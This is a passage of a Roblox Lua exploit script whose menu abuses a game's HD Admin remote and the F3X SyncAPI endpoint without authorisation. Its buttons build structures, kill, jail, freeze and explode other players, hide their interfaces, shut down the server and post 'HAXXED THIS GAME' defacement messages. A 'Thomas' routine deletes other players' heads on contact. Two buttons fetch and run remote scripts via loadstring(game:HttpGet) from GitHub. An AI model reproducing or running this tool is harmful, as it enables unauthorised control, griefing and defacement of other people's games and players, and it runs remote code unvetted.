            {["Part"] = cafeteriaFloor, ["CFrame"] = CFrame.new(0, 2.5, -45), ["Size"] = Vector3.new(30, 1, 25)}
        })
        serverEndpoint:InvokeServer("SyncColor", {
            {["Part"] = cafeteriaFloor, ["Color"] = Color3.fromRGB(25, 25, 25), ["UnionColoring"] = false}
        })
        
        -- Yemekhane Duvarlar
        local cafeteriaWalls = {
            {pos = CFrame.new(0, 5, -32.5), size = Vector3.new(30, 10, 1)},  
            {pos = CFrame.new(0, 5, -57.5), size = Vector3.new(30, 10, 1)},  
            {pos = CFrame.new(15, 5, -45), size = Vector3.new(1, 10, 25)},  
            {pos = CFrame.new(-15, 5, -45), size = Vector3.new(1, 10, 25)} 
        }
        
        for _, wall in ipairs(cafeteriaWalls) do
            local wallPart = serverEndpoint:InvokeServer("CreatePart", "Normal", wall.pos, workspace)
            serverEndpoint:InvokeServer("SyncResize", {
                {["Part"] = wallPart, ["CFrame"] = wall.pos, ["Size"] = wall.size}
            })
            serverEndpoint:InvokeServer("SyncColor", {
                {["Part"] = wallPart, ["Color"] = Color3.fromRGB(35, 35, 35), ["UnionColoring"] = false}
            })
        end
        
        -- Yemekhane Giriş Kapısı (Disable Collision)
        local cafeteriaDoor = serverEndpoint:InvokeServer("CreatePart", "Normal", CFrame.new(0, 3, -32.4), workspace)
        serverEndpoint:InvokeServer("SyncResize", {
            {["Part"] = cafeteriaDoor, ["CFrame"] = CFrame.new(0, 3, -32.4), ["Size"] = Vector3.new(4, 6, 1)}
        })
        serverEndpoint:InvokeServer("SyncColor", {
            {["Part"] = cafeteriaDoor, ["Color"] = Color3.fromRGB(60, 60, 60), ["UnionColoring"] = false}
        })
        serverEndpoint:InvokeServer("SyncCollision", {
            {["Part"] = cafeteriaDoor, ["CanCollide"] = false}
        })
        
        -- KOLONLAR
        local columnPositions = {
            CFrame.new(10, 5, -40),
            CFrame.new(-10, 5, -40),
            CFrame.new(10, 5, -50),
            CFrame.new(-10, 5, -50)
        }
        
        for _, pos in ipairs(columnPositions) do
            local column = serverEndpoint:InvokeServer("CreatePart", "Normal", pos, workspace)
            serverEndpoint:InvokeServer("SyncResize", {
                {["Part"] = column, ["CFrame"] = pos, ["Size"] = Vector3.new(2, 10, 2)}
            })
            serverEndpoint:InvokeServer("SyncColor", {
                {["Part"] = column, ["Color"] = Color3.fromRGB(40, 40, 40), ["UnionColoring"] = false}
            })
        end
        
        -- MASALAR (4 sandalyeli)
        local tablePositions = {
            {pos = CFrame.new(8, 3, -40), chairs = {
                CFrame.new(10, 2.5, -40),
                CFrame.new(6, 2.5, -40),
                CFrame.new(8, 2.5, -42),
                CFrame.new(8, 2.5, -38)
            }},
            {pos = CFrame.new(-8, 3, -40), chairs = {
                CFrame.new(-10, 2.5, -40),
                CFrame.new(-6, 2.5, -40),
                CFrame.new(-8, 2.5, -42),
                CFrame.new(-8, 2.5, -38)
            }},
            {pos = CFrame.new(8, 3, -50), chairs = {
                CFrame.new(10, 2.5, -50),
                CFrame.new(6, 2.5, -50),
                CFrame.new(8, 2.5, -52),
                CFrame.new(8, 2.5, -48)
            }},
            {pos = CFrame.new(-8, 3, -50), chairs = {
                CFrame.new(-10, 2.5, -50),
                CFrame.new(-6, 2.5, -50),
                CFrame.new(-8, 2.5, -52),
                CFrame.new(-8, 2.5, -48)
            }}
        }
        
        for _, tableData in ipairs(tablePositions) do
            -- Masa
            local tablePart = serverEndpoint:InvokeServer("CreatePart", "Normal", tableData.pos, workspace)
            serverEndpoint:InvokeServer("SyncResize", {
                {["Part"] = tablePart, ["CFrame"] = tableData.pos, ["Size"] = Vector3.new(4, 1, 4)}
            })
            serverEndpoint:InvokeServer("SyncColor", {
                {["Part"] = tablePart, ["Color"] = Color3.fromRGB(50, 50, 50), ["UnionColoring"] = false}
            })
            
            -- Sandalyeler
            for _, chairPos in ipairs(tableData.chairs) do
                local chair = serverEndpoint:InvokeServer("CreatePart", "Normal", chairPos, workspace)
                serverEndpoint:InvokeServer("SyncResize", {
                    {["Part"] = chair, ["CFrame"] = chairPos, ["Size"] = Vector3.new(1.5, 3, 1.5)}
                })
                serverEndpoint:InvokeServer("SyncColor", {
                    {["Part"] = chair, ["Color"] = Color3.fromRGB(60, 60, 60), ["UnionColoring"] = false}
                })
            end
        end
        
        -- KITCHEN
        -- Kitchen Zemin
        local kitchenFloor = serverEndpoint:InvokeServer("CreatePart", "Normal", CFrame.new(20, 2.5, -45), workspace)
        serverEndpoint:InvokeServer("SyncResize", {
            {["Part"] = kitchenFloor, ["CFrame"] = CFrame.new(20, 2.5, -45), ["Size"] = Vector3.new(15, 1, 15)}
        })
        serverEndpoint:InvokeServer("SyncColor", {
            {["Part"] = kitchenFloor, ["Color"] = Color3.fromRGB(25, 25, 25), ["UnionColoring"] = false}
        })
        
        -- Kitchen Duvarlar
        local kitchenWalls = {
            {pos = CFrame.new(20, 5, -37.5), size = Vector3.new(15, 10, 1)},  
            {pos = CFrame.new(20, 5, -52.5), size = Vector3.new(15, 10, 1)},   
            {pos = CFrame.new(27.5, 5, -45), size = Vector3.new(1, 10, 15)},   
            {pos = CFrame.new(12.5, 5, -45), size = Vector3.new(1, 10, 15)}    
        }
        
        for _, wall in ipairs(kitchenWalls) do
            local wallPart = serverEndpoint:InvokeServer("CreatePart", "Normal", wall.pos, workspace)
            serverEndpoint:InvokeServer("SyncResize", {
                {["Part"] = wallPart, ["CFrame"] = wall.pos, ["Size"] = wall.size}
            })
            serverEndpoint:InvokeServer("SyncColor", {
                {["Part"] = wallPart, ["Color"] = Color3.fromRGB(35, 35, 35), ["UnionColoring"] = false}
            })
        end
        
        -- Kitchen (Disable Collision)
        local kitchenDoor = serverEndpoint:InvokeServer("CreatePart", "Normal", CFrame.new(20, 3, -37.4), workspace)
        serverEndpoint:InvokeServer("SyncResize", {
            {["Part"] = kitchenDoor, ["CFrame"] = CFrame.new(20, 3, -37.4), ["Size"] = Vector3.new(3, 6, 1)}
        })
        serverEndpoint:InvokeServer("SyncColor", {
            {["Part"] = kitchenDoor, ["Color"] = Color3.fromRGB(60, 60, 60), ["UnionColoring"] = false}
        })
        serverEndpoint:InvokeServer("SyncCollision", {
            {["Part"] = kitchenDoor, ["CanCollide"] = false}
        })
        
        -- BUZDOLABI
        local fridge = serverEndpoint:InvokeServer("CreatePart", "Normal", CFrame.new(22, 4, -48), workspace)
        serverEndpoint:InvokeServer("SyncResize", {
            {["Part"] = fridge, ["CFrame"] = CFrame.new(22, 4, -48), ["Size"] = Vector3.new(3, 6, 2)}
        })
        serverEndpoint:InvokeServer("SyncColor", {
            {["Part"] = fridge, ["Color"] = Color3.fromRGB(200, 200, 200), ["UnionColoring"] = false}
        })
        
        -- DOLAPLAR (4 adet)
        local cabinetPositions = {
            CFrame.new(17, 4, -48),
            CFrame.new(17, 4, -42),
            CFrame.new(23, 4, -42),
            CFrame.new(26, 4, -45)
        }
        
        for _, pos in ipairs(cabinetPositions) do
            local cabinet = serverEndpoint:InvokeServer("CreatePart", "Normal", pos, workspace)
            serverEndpoint:InvokeServer("SyncResize", {
                {["Part"] = cabinet, ["CFrame"] = pos, ["Size"] = Vector3.new(2, 6, 2)}
            })
            serverEndpoint:InvokeServer("SyncColor", {
                {["Part"] = cabinet, ["Color"] = Color3.fromRGB(80, 80, 80), ["UnionColoring"] = false}
            })
        end
        
        local prepTable = serverEndpoint:InvokeServer("CreatePart", "Normal", CFrame.new(20, 3, -42), workspace)
        serverEndpoint:InvokeServer("SyncResize", {
            {["Part"] = prepTable, ["CFrame"] = CFrame.new(20, 3, -42), ["Size"] = Vector3.new(6, 2, 3)}
        })
        serverEndpoint:InvokeServer("SyncColor", {
            {["Part"] = prepTable, ["Color"] = Color3.fromRGB(70, 70, 70), ["UnionColoring"] = false}
        })
        

        local utensils = serverEndpoint:InvokeServer("CreatePart", "Normal", CFrame.new(20, 3.6, -42), workspace)
        serverEndpoint:InvokeServer("SyncResize", {
            {["Part"] = utensils, ["CFrame"] = CFrame.new(20, 3.6, -42), ["Size"] = Vector3.new(4, 0.2, 2)}
        })
        serverEndpoint:InvokeServer("SyncColor", {
            {["Part"] = utensils, ["Color"] = Color3.fromRGB(150, 150, 150), ["UnionColoring"] = false}
        })
        
        -- EXIT KAPISI
        local exitDoor = serverEndpoint:InvokeServer("CreatePart", "Normal", CFrame.new(0, 3, -57.4), workspace)
        serverEndpoint:InvokeServer("SyncResize", {
            {["Part"] = exitDoor, ["CFrame"] = CFrame.new(0, 3, -57.4), ["Size"] = Vector3.new(4, 6, 1)}
        })
        serverEndpoint:InvokeServer("SyncColor", {
            {["Part"] = exitDoor, ["Color"] = Color3.fromRGB(80, 80, 80), ["UnionColoring"] = false}
        })
        serverEndpoint:InvokeServer("SyncCollision", {
            {["Part"] = exitDoor, ["CanCollide"] = false}
        })
        
        local fencePositions = {
            {pos = CFrame.new(0, 2, -80), size = Vector3.new(100, 4, 2)},
            {pos = CFrame.new(0, 2, 20), size = Vector3.new(100, 4, 2)},
            {pos = CFrame.new(50, 2, -30), size = Vector3.new(2, 4, 100)}, 
            {pos = CFrame.new(-50, 2, -30), size = Vector3.new(2, 4, 100)} 
        }
        
        for _, fence in ipairs(fencePositions) do
            local fencePart = serverEndpoint:InvokeServer("CreatePart", "Normal", fence.pos, workspace)
            serverEndpoint:InvokeServer("SyncResize", {
                {["Part"] = fencePart, ["CFrame"] = fence.pos, ["Size"] = fence.size}
            })
            serverEndpoint:InvokeServer("SyncColor", {
                {["Part"] = fencePart, ["Color"] = Color3.fromRGB(50, 50, 50), ["UnionColoring"] = false}
            })
        end
        
        local lightPositions = {
            CFrame.new(0, 9, 0),        -- Safe Room
            CFrame.new(0, 9, -20),      -- Koridor
            CFrame.new(0, 9, -45),      -- Yemekhane
            CFrame.new(20, 9, -45)      -- Kitchen
        }
        
        for _, pos in ipairs(lightPositions) do
            local light = serverEndpoint:InvokeServer("CreatePart", "Normal", pos, workspace)
            serverEndpoint:InvokeServer("CreateLights", {
                {["Part"] = light, ["LightType"] = "PointLight"}
            })
            serverEndpoint:InvokeServer("SyncLighting", {
                {["Part"] = light, ["LightType"] = "PointLight", ["Brightness"] = 3, ["Color"] = Color3.new(1, 1, 1)}
            })
            serverEndpoint:InvokeServer("SyncMaterial", {
                {["Part"] = light, ["Transparency"] = 1}
            })
            serverEndpoint:InvokeServer("SyncCollision", {
                {["Part"] = light, ["CanCollide"] = false}
            })
        end
        
        -- SPAWN NOKTASI (Safe Room içinde)
        local spawnPoint = serverEndpoint:InvokeServer("CreatePart", "Spawn", CFrame.new(0, 3, 0), workspace)
        serverEndpoint:InvokeServer("SyncResize", {
            {["Part"] = spawnPoint, ["CFrame"] = CFrame.new(0, 3, 0), ["Size"] = Vector3.new(4, 1, 4)}
        })
        serverEndpoint:InvokeServer("SyncMaterial", {
            {["Part"] = spawnPoint, ["Transparency"] = 1}
        })
        serverEndpoint:InvokeServer("SyncCollision", {
            {["Part"] = spawnPoint, ["CanCollide"] = false}
        })
        
        RequestCommand:InvokeServer(";res all")
        wait(1)
        RequestCommand:InvokeServer(";teleport all 0 3 0")
    end
    
    createMilitaryBase()
    
    RequestCommand:InvokeServer(";sm 0nkidd MILITARY BASE CREATED!")
    RequestCommand:InvokeServer(";sh WELCOME TO 0nkidd BASE")
end)

-- ====== ADMIN TAB ======
createButton(adminScroll, "Hide all Others GUI'S and HD", function()
    local Request = game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	Request:InvokeServer(";hideGuis others")
	Request:InvokeServer(";hg Your script menu has been deleted by team 0nkidd!!")
end)

createButton(adminScroll, "Arrest others", function()
    local Request = game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    Request:InvokeServer(";jail others ;ice others ;disco ;freeze others ;blur others ;fog 0 0 ;Hg YOU WERE ARRESTED BY team 0nkidd HAHAHHA")
end)

createButton(adminScroll, "ForceField", function()
    local Request = game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    Request:InvokeServer(";ff")
end)

createButton(adminScroll, "message", function()
    local Request = game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    Request:InvokeServer(";notice all Team 0nkidd HAXXED THIS GAME HAHAHHA !!!")
end)

createButton(adminScroll, "spin all", function()
    local Request = game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    Request:InvokeServer(";spin all 30 ;fire all ;sit all")
end)

createButton(adminScroll, "spam team", function()
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
		RequestCommand:InvokeServer(";createteam red team 0nkidd was here")
		RequestCommand:InvokeServer(";createteam  blue team 0nkidd ")
		RequestCommand:InvokeServer(";createteam  db hacked by 0nkidd")
		RequestCommand:InvokeServer(";createteam  green hail 0nkidd")
		RequestCommand:InvokeServer(";createteam  dg team 0nkidd on top!")
		RequestCommand:InvokeServer(";createteam  pk hacked by 0nkidd skids")
		RequestCommand:InvokeServer(";createteam  p ez")
		RequestCommand:InvokeServer(";createteam  y sigmahax")
		RequestCommand:InvokeServer(";createteam  o prohax")
		RequestCommand:InvokeServer(";createteam  black 0nkidd hacked this game")
		RequestCommand:InvokeServer(";createteam white lol skids")
	end)

createButton(adminScroll, "remove all team", function()
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
		RequestCommand:InvokeServer(";removeteam")
		RequestCommand:InvokeServer(";removeteam")
		RequestCommand:InvokeServer(";removeteam")
		RequestCommand:InvokeServer(";removeteam")
		RequestCommand:InvokeServer(";removeteam")
		RequestCommand:InvokeServer(";removeteam")
		RequestCommand:InvokeServer(";removeteam")
		RequestCommand:InvokeServer(";removeteam")
		RequestCommand:InvokeServer(";removeteam")
		RequestCommand:InvokeServer(";removeteam")
		RequestCommand:InvokeServer(";removeteam")
		RequestCommand:InvokeServer(";removeteam")
		RequestCommand:InvokeServer(";removeteam")
		RequestCommand:InvokeServer(";removeteam")
    end)

createButton(adminScroll, "Thomas", function()
    local Request = game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    Request:InvokeServer(";btools me")
	            local player = game.Players.LocalPlayer
        		local char = player.Character
        		local tool
        		for i,v in player:GetDescendants() do
        			if v.Name == "SyncAPI" then
        				tool = v.Parent
        			end
        		end
        		for i,v in game.ReplicatedStorage:GetDescendants() do
        			if v.Name == "SyncAPI" then
        				tool = v.Parent
        			end
        		end
        		--craaa
        		remote = tool.SyncAPI.ServerEndpoint
        		function _(args)
        			remote:InvokeServer(unpack(args))
        		end
        		function SetCollision(part,boolean)
        			local args = {
        				[1] = "SyncCollision",
        				[2] = {
        					[1] = {
        						["Part"] = part,
        						["CanCollide"] = boolean
        					}
        				}
        			}
        			_(args)
        		end
        		function SetAnchor(boolean,part)
        			local args = {
        				[1] = "SyncAnchor",
        				[2] = {
        					[1] = {
        						["Part"] = part,
        						["Anchored"] = boolean
        					}
        				}
        			}
        			_(args)
        		end
        		function CreatePart(cf,parent)
        			local args = {
        				[1] = "CreatePart",
        				[2] = "Normal",
        				[3] = cf,
        				[4] = parent
        			}
        			_(args)
        		end
        		function DestroyPart(part)
        			local args = {
        				[1] = "Remove",
        				[2] = {
        					[1] = part
        				}
        			}
        			_(args)
        		end
        		function MovePart(part,cf)
        			local args = {
        				[1] = "SyncMove",
        				[2] = {
        					[1] = {
        						["Part"] = part,
        						["CFrame"] = cf
        					}
        				}
        			}
        			_(args)
        		end
        		function Resize(part,size,cf)
        			local args = {
        				[1] = "SyncResize",
        				[2] = {
        					[1] = {
        						["Part"] = part,
        						["CFrame"] = cf,
        						["Size"] = size
        					}
        				}
        			}
        			_(args)
        		end
        		function AddMesh(part)
        			local args = {
        				[1] = "CreateMeshes",
        				[2] = {
        					[1] = {
        						["Part"] = part
        					}
        				}
        			}
        			_(args)
        		end
        
        		function SetMesh(part,meshid)
        			local args = {
        				[1] = "SyncMesh",
        				[2] = {
        					[1] = {
        						["Part"] = part,
        						["MeshId"] = "rbxassetid://"..meshid
        					}
        				}
        			}
        			_(args)
        		end
        		function SetTexture(part, texid)
        			local args = {
        				[1] = "SyncMesh",
        				[2] = {
        					[1] = {
        						["Part"] = part,
        						["TextureId"] = "rbxassetid://"..texid
        					}
        				}
        			}
        			_(args)
        		end
        		function SetName(part, stringg)
        			local args = {
        				[1] = "SetName",
        				[2] = {
        					[1] = workspace.Part
        				},
        				[3] = stringg
        			}
        
        			_(args)
        		end
        		function MeshResize(part,size)
        			local args = {
        				[1] = "SyncMesh",
        				[2] = {
        					[1] = {
        						["Part"] = part,
        						["Scale"] = size
        					}
        				}
        			}
        			_(args)
        		end
        		function Weld(part1, part2,lead)
        			local args = {
        				[1] = "CreateWelds",
        				[2] = {
        					[1] = part1,
        					[2] = part2
        				},
        				[3] = lead
        			}
        			_(args)
        
        		end
        		function SetLocked(part,boolean)
        			local args = {
        				[1] = "SetLocked",
        				[2] = {
        					[1] = part
        				},
        				[3] = boolean
        			}
        			_(args)
        		end
        		function SetTrans(part,int)
        			local args = {
        				[1] = "SyncMaterial",
        				[2] = {
        					[1] = {
        						["Part"] = part,
        						["Transparency"] = int
        					}
        				}
        			}
        			_(args)
        		end
        		function CreateSpotlight(part)
        			local args = {
        				[1] = "CreateLights",
        				[2] = {
        					[1] = {
        						["Part"] = part,
        						["LightType"] = "SpotLight"
        					}
        				}
        			}
        			_(args)
        		end
        		function SyncLighting(part,brightness)
        			local args = {
        				[1] = "SyncLighting",
        				[2] = {
        					[1] = {
        						["Part"] = part,
        						["LightType"] = "SpotLight",
        						["Brightness"] = brightness
        					}
        				}
        			}
        			_(args)
        		end
        		local player = game.Players.LocalPlayer
        local char = player.Character
        
        function xd()
        spawn(function()
        local args = {
            [1] = "SyncMaterial",
            [2] = {
                [1] = {
                    ["Part"] = game:GetService("Players").LocalPlayer.Character.Torso,
                    ["Transparency"] = 1
                },
                [2] = {
                    ["Part"] = game:GetService("Players").LocalPlayer.Character:FindFirstChild("Left Leg"),
                    ["Transparency"] = 1
                },
                [3] = {
                    ["Part"] = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart,
                    ["Transparency"] = 1
                },
                [4] = {
                    ["Part"] = game:GetService("Players").LocalPlayer.Character:FindFirstChild("Right Leg"),
                    ["Transparency"] = 1
                },
                [5] = {
                    ["Part"] = game:GetService("Players").LocalPlayer.Character:FindFirstChild("Right Arm"),
                    ["Transparency"] = 1
                },
                [6] = {
                    ["Part"] = game:GetService("Players").LocalPlayer.Character:FindFirstChild("Left Arm"),
                    ["Transparency"] = 1
                },
                [7] = {
                    ["Part"] = game:GetService("Players").LocalPlayer.Character.Head,
                    ["Transparency"] = 1
                },
            }
        }
        
        _(args)
        
        			end)
        end
        
        function Thomas(player)
        			SetAnchor(true,char.HumanoidRootPart)
        			CreatePart(char.HumanoidRootPart.CFrame,char,"Normal")
        			SetCollision(char.Part,false)
        			SetLocked(char.Part,false)
        			Resize(char.Part,Vector3.new(5,5,10),char.HumanoidRootPart.CFrame)
        			CreateSpotlight(char.Part)
        			SyncLighting(char.Part,100)
        			SetLocked(char.HumanoidRootPart,false)
        			Weld(char.Part,char.HumanoidRootPart,char.Part)
        			SetAnchor(false,char.Part)
        			AddMesh(char.Part)
        			MeshResize(char.Part,Vector3.new(2,2,1.5))
        			SetMesh(char.Part,"2231280549")
        			SetTexture(char.Part,"2231280614")
        			SetAnchor(false,char.HumanoidRootPart)
        	char.Humanoid.WalkSpeed = 80
        			local function SFX(id) local s=Instance.new("Sound",char.Torso); s.SoundId = "rbxassetid://"..id; s.Volume = 1; return s; end
        char.Part.Touched:connect(function(p)
        	if p.Parent then
        		if p.Parent:IsA("Model") then
        			if game.Players:FindFirstChild(p.Parent.Name) then
        				if p.Parent.Name ~= game.Players.LocalPlayer.Name then
        				spawn(function()
        					DestroyPart(game.Players:FindFirstChild(p.Parent.Name).Character.Head)
        					end)
        					local Whistle = SFX(475073913)
        					Whistle:Play()
        				end
        			end
        		end
        	end
        end)
        
        local Music = SFX(0)
        Music.Pitch = 1.15
        Music:Play()
        					
        			game:GetService("RunService").RenderStepped:Connect(function()
        				for i,v in char:GetDescendants() do
        					if v:IsA("BasePart") then
        						char.Humanoid.WalkSpeed = 80
        						v.CanCollide = false
        					end
        				end
        			end)
        		end
        		Thomas(player)
        		xd()
        end)

createButton(adminScroll, "hint 1", function()
    local Request = game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    Request:InvokeServer(";hg Team 0nkidd HAXXED THIS GAME HAHAHHA !!!")
end)

createButton(adminScroll, "hint 2", function()
    local Request = game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    Request:InvokeServer(";hg Team 0nkidd destroyed this game hahahha !!")
end)

createButton(adminScroll, "hint 3", function()
    local Request = game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    Request:InvokeServer(";hg Enjoy your new game skid hahahha!!")
end)

createButton(adminScroll, "Bring All", function()
    local Request = game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    Request:InvokeServer(";bring all")
end)

createButton(adminScroll, "Kill All", function()
    local Request = game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    Request:InvokeServer(";kill all")
end)

createButton(adminScroll, "Kill Others", function()
    local Request = game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    Request:InvokeServer(";kill others")
end)

createButton(adminScroll, "Explode Others", function()
    local Request = game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    Request:InvokeServer(";explode others")
end)

createButton(adminScroll, "Shutdown", function()
    local Request = game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    Request:InvokeServer(";shutdown  destroyed this server!")
end)

createButton(adminScroll, "R6 All", function()
    local Request = game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    Request:InvokeServer(";r6 all")
end)

createButton(adminScroll, "Avatars 0nkidd", function()
    local Request = game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    Request:InvokeServer(";char all 0nkidd")
end)

createButton(adminScroll, "Titles", function()
    local Request = game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    Request:InvokeServer(";title all join team 0nkidd today!")
	Request:InvokeServer(";titleg me 0nkidd")
end)

createButton(adminScroll, "disco", function()
    local Request = game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    Request:InvokeServer(";disco")
end)

createButton(adminScroll, "undisco", function()
    local Request = game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    Request:InvokeServer(";undisco")
end)

createButton(adminScroll, "fog", function()
    local Request = game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    Request:InvokeServer(";fog 0 0")
end)

createButton(adminScroll, "unfog", function()
    local Request = game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    Request:InvokeServer(";unfog")
end)


createButton(adminScroll, "effects all", function()
    local Request = game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    Request:InvokeServer(";fire all ;sparkles all ;smoke all ;blur others ;spin others 75")
end)

createButton(adminScroll, "CmdBar2", function()
    local Request = game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    Request:InvokeServer(";cmdbar2")
end)

createButton(adminScroll, "Give you All", function()
    local Request = game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    Request:InvokeServer(";give me all")
end)

createButton(adminScroll, "Destroy players", function()
    local Request = game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    Request:InvokeServer(";res all ;unfly all ;char all 0nkidd ;spin all 55 ;blur all")
	Request:InvokeServer(";uncmdbar2 all")
	Request:InvokeServer(";res all ;unfly all ;char all  ;spin all 55 ;blur all")
	Request:InvokeServer(";fog 0 0; ;disco ;sparkles all ;smoke all")
	Request:InvokeServer(";time 23")
	Request:InvokeServer(";hg ENJOY YOUR NEW GAME HAHAHHA")
end)

createButton(adminScroll, "spam zombies", function()
    local Request = game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent

		RequestCommand:InvokeServer(";insert 187789986")
		RequestCommand:InvokeServer(";insert 187789986")
		RequestCommand:InvokeServer(";insert 187789986")
		RequestCommand:InvokeServer(";insert 187789986")
		RequestCommand:InvokeServer(";insert 187789986")
		RequestCommand:InvokeServer(";insert 187789986")
		RequestCommand:InvokeServer(";insert 187789986")
		RequestCommand:InvokeServer(";insert 187789986")
		RequestCommand:InvokeServer(";insert 187789986")
		RequestCommand:InvokeServer(";insert 187789986")

	Wait(1)
end)

createButton(adminScroll, "Infinite Yield", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
end)

createButton(adminScroll, "c00lgui F3X", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/malucomaf16/c00lgui-hdadmin/refs/heads/main/c00lgui-hdadmin.lua"))()
end)

-- ====== MUSICS TAB ======
createButton(musicScroll, "0nkidd Theme", function()
    local Request = game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    Request:InvokeServer(";music 1839246711")
    Request:InvokeServer(";volume inf")
end)

createButton(musicScroll, "Tubers Moan", function()
    local Request = game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    Request:InvokeServer(";music 6129291390")
    Request:InvokeServer(";volume inf")
end)

createButton(musicScroll, "Crab Rave", function()
    local Request = game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    Request:InvokeServer(";music 5410086218")
    Request:InvokeServer(";volume inf")
end)

createButton(musicScroll, "Phonk", function()
    local Request = game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    Request:InvokeServer(";music 5356466111")
    Request:InvokeServer(";volume inf")
end)

createButton(musicScroll, "RAMPAGE", function()
    local Request = game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    Request:InvokeServer(";music 100379372434844 ;volume inf")
end)

createButton(musicScroll, "this is sparta (remix)", function()
    local Request = game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    Request:InvokeServer(";music 140240856766854 ;pitch 0.20 ;volume inf")
end)

createButton(musicScroll, "lift off", function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
	RequestCommand:InvokeServer(";music 94284750410104 ;pitch 0.19 ;volume inf")
	end)

createButton(musicScroll, "ERROR 264", function()
    local Request = game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
    Request:InvokeServer(";music 140009716850576 ;pitch 0.85 ;volume inf")
end)
createButton(musicScroll, "spooky scare lol", function()
    local Request = game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
    Request:InvokeServer(";music 100828050594137 ;pitch 1.25 ;volume inf")
end)

createButton(musicScroll, "won't stop us", function()
    local Request = game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    Request:InvokeServer(";music 1847661821")
    Request:InvokeServer(";volume inf")
end)

createButton(musicScroll, "cofe (troll)", function()
    local Request = game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    Request:InvokeServer(";music 124649849731806")
    Request:InvokeServer(";volume inf")
end)

createButton(musicScroll, "Stop Music", function()
    local Request = game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    Request:InvokeServer(";unmusic")
end)

local function updateCanvasSizes()
    f3xScroll.CanvasSize   = UDim2.new(0, 0, 0, f3xLayout.AbsoluteContentSize.Y + 20)
    realmsScroll.CanvasSize= UDim2.new(0, 0, 0, realmsLayout.AbsoluteContentSize.Y + 20)
    adminScroll.CanvasSize = UDim2.new(0, 0, 0, adminLayout.AbsoluteContentSize.Y + 20)
    musicScroll.CanvasSize = UDim2.new(0, 0, 0, musicLayout.AbsoluteContentSize.Y + 20)
end

f3xLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(updateCanvasSizes)
realmsLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(updateCanvasSizes)
adminLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(updateCanvasSizes)
musicLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(updateCanvasSizes)

f3xTab.MouseButton1Click:Connect(function()
    f3xScroll.Visible = true
    realmsScroll.Visible = false
    adminScroll.Visible = false
    musicScroll.Visible = false
end)

realmsTab.MouseButton1Click:Connect(function()
    f3xScroll.Visible = false
    realmsScroll.Visible = true
    adminScroll.Visible = false
    musicScroll.Visible = false
end)

